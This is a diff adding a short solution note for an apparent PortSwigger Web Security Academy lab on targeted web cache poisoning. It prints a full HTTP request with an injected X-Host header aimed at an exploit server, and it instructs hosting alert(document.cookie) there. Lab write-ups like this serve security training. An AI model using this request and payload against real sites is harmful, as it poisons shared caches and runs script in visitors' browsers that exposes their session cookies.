@@ -1,0 +1,19 @@
+Targeted web cache poisoning using an unknown header
+
+Follow the intructions provided until you obtain the target's User-Agent. Once done, here's how the request should look like:
+
+GET / HTTP/1.1
+Host: ac661f141f2d82e4800bb3f900e30057.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/web-security/web-cache-poisoning/exploiting/lab-web-cache-poisoning-targeted-using-an-unknown-header
+Connection: close
+X-Host: acc11faa1fbf82e880a1b31601c900b2.web-security-academy.net
+Upgrade-Insecure-Requests: 1
+
+
+
+Remember to host alert(document.cookie) on the exploit server.
+If you're still having trouble getting the lab complete prompt, disable HTTPS on the exploit server.
